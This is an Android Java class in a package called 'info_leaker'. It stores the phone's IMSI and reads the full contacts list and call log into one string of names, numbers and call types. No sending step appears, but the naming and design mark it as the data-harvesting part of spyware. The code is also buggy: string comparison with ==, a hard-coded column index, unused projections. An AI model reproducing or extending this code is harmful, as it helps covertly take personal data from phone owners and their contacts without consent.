package com.info_leaker;

import java.io.IOException;

import android.app.Activity;
import android.content.ContentResolver;
import android.database.Cursor;
import android.net.Uri;
import android.provider.Contacts;
import android.provider.CallLog;


@SuppressWarnings("deprecation")
public class GetInfo extends Activity
{
	String m_IMSI;
	
	public GetInfo(String imsi){
		m_IMSI = imsi;
	}
	public String getIMSI(){
		return m_IMSI;
	}
	public int getContactNum(ContentResolver cr)// throws IOException
	{
		Cursor c = getContacts(cr);
		c.moveToFirst();
		int cnt = 1;
		while(!c.isLast())
		{
			++cnt;
			c.moveToNext();
		}

		return cnt;
	}
	public int getCallNum(ContentResolver cr)// throws IOException
	{
		Cursor l = getLog(cr);
		l.moveToFirst();
		int cnt = 1;
		while(!l.isLast())
		{
			++cnt;
			l.moveToNext();
		}

		return cnt;
	}
	
	public String getRecent(ContentResolver cr, boolean byname) throws IOException
	{
		String result = "";
		Cursor c = getLog(cr);
		c.moveToFirst();
		result = c.getString(c.getColumnIndexOrThrow(CallLog.Calls.NUMBER));
		
		if(byname){
			result = NumToName(result, cr);
		}
		return result;
	}
	
	public String NumToName(String num,ContentResolver cr){
		String nam = num;
		Cursor c = getContacts(cr);
		c.moveToFirst();
		while(!c.isLast())
		{
			if(c.getString(c.getColumnIndexOrThrow(Contacts.People.NUMBER))==num)
			{
				nam = c.getString(c.getColumnIndexOrThrow(Contacts.People.NAME));
				break;
			}
			c.moveToNext();
		}
		if(c.getString(c.getColumnIndexOrThrow(Contacts.People.NUMBER))==num)
			nam = c.getString(c.getColumnIndexOrThrow(Contacts.People.NAME));
		return nam;
	}
	
	private Cursor getContacts(ContentResolver cr)
    {
        Uri uri = Contacts.People.CONTENT_URI;
        String[] projection = new String[] {
        		Contacts.People._ID,
        		Contacts.People.NAME,
                Contacts.People.NUMBER
        };
        return cr.query(uri, null ,null, null, Contacts.People.DEFAULT_SORT_ORDER);
    }
	
	private Cursor getLog(ContentResolver cr)
	{
		Uri uri = CallLog.Calls.CONTENT_URI;
		String[] projection = new String[] {
				CallLog.Calls._ID,
				CallLog.Calls.TYPE,
				CallLog.Calls.NUMBER
		};	
		return cr.query(uri, null,null,null, CallLog.Calls.DEFAULT_SORT_ORDER);
	}
	
	public String getstr(ContentResolver cr) throws IOException
	{
		String info = "\r\n";
		Cursor c = getContacts(cr);
		c.moveToFirst();
		while(!c.isLast())
		{
			info += c.getString(c.getColumnIndexOrThrow(Contacts.People.NAME));
			info += c.getString(17);
			info += "\r\n";
			c.moveToNext();
		}
		info += c.getString(c.getColumnIndexOrThrow(Contacts.People.NAME));
		info += c.getString(c.getColumnIndexOrThrow(Contacts.People.NUMBER));
		info += "\r\n";
		Cursor l = getLog(cr);
		l.moveToFirst();
		while(!l.isLast())
		{
			info += l.getString(l.getColumnIndexOrThrow(CallLog.Calls.TYPE));
			info += l.getString(l.getColumnIndexOrThrow(CallLog.Calls.NUMBER));
			info += "\r\n";
			l.moveToNext();
		}
		info += l.getString(l.getColumnIndexOrThrow(CallLog.Calls.TYPE));
		info += l.getString(l.getColumnIndexOrThrow(CallLog.Calls.NUMBER));
		info += "\r\n";
		return info;
	}

}
